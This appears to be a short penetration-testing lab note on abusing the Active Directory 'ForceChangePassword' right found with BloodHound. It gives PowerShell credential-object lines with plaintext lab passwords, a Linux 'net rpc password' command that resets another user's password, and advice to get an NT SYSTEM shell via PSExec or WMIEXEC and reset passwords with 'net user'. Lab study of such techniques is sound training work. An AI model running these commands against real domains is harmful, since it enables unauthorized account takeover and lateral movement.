IF you find from Bloodhound that you user/computer object have **"ForceChangePassword"** permission over another user you can use follow this:

1)If your USER have PERMISSIONS
```
$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$riley = New-Object System.Management.Automation.PSCredential('PAINTERS\riley', $SecPassword)
IF you need to use delegation from other credentials:
$SecPassword = ConvertTo-SecureString '!QAZ1qaz' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('painters.htb\web_svc', $SecPassword)
```
And then pass them with **-Credential $Cred**

This can be done directly from Linux as well with.
```shell-session
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

2)IF computer object have permissions then you need NT System permission to perform a password reset.
Use PSExec/WMIEXEC instead of Evil-WINRM that invokes a shell as NT SYSTEM.
When you get a PS/SMBEXEC as NT then just use: net user USERNAME PASSWORD
